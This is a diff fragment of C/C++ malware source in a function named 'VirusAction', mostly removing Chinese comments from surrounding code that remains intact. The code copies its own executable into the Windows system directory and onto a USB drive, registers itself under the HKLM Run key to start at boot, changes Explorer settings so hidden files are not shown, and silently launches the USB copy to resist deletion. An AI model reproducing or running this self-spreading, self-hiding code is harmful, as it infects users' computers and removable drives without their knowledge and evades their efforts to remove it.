@@ -60,21 +60,21 @@ void VirusAction()
 	
 	//拷贝到系统目录
 	char path_system[MAX_PATH];
-	GetSystemDirectory(path_system,MAX_PATH);  //获得windows目录
+	GetSystemDirectory(path_system,MAX_PATH);  
 	strcat(path_system,"\\20130927.exe");
 	char path_thisEXE[MAX_PATH];
-	GetModuleFileName(NULL,path_thisEXE,MAX_PATH);   //获取当前程序可执行文件路径名
+	GetModuleFileName(NULL,path_thisEXE,MAX_PATH);  
 	
 	//If this parameter is TRUE and the new file already exists, the function fails
-	CopyFile(path_thisEXE,path_system,TRUE); //实现拷贝
+	CopyFile(path_thisEXE,path_system,TRUE); 
 	
 	//拷贝到U盘
-	CreateDirectory(U_path,NULL); //U_path :U盘路径   path_thisEXE：
+	CreateDirectory(U_path,NULL); 
 	strcat(U_path,"\\20130927.exe");
 	CopyFile(path_thisEXE,U_path,TRUE);
  
 	//开机启动此程序
-	HKEY h_openkey;   //注册表
+	HKEY h_openkey;  
 	DWORD cbData_1=200;
 	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&h_openkey); //打开一个指定的注册表键
 	RegSetValueEx(h_openkey,"KeyName",0,REG_SZ,(BYTE*)path_system,cbData_1);
@@ -89,14 +89,14 @@ void VirusAction()
 	//设置隐藏文件夹不可见
 	DWORD Data=2;
 	RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",0,KEY_ALL_ACCESS,&h_openkey);
-	RegSetValueEx(h_openkey,"Hidden",0,REG_DWORD,(const BYTE*)(&Data),sizeof(Data));//最后面的那个参数很重要
+	RegSetValueEx(h_openkey,"Hidden",0,REG_DWORD,(const BYTE*)(&Data),sizeof(Data));
 	RegCloseKey(h_openkey);
  
  
 	//执行U盘里那个程序，防止删除
-	if (strcmp(path_thisEXE,U_path)!=0)	//只执行一次
-	{
-		WinExec(U_path,SW_HIDE);  //隐藏
+	if (strcmp(path_thisEXE,U_path)!=0)	
+	{ 
+		WinExec(U_path,SW_HIDE);  
 	}
 	else
 	{
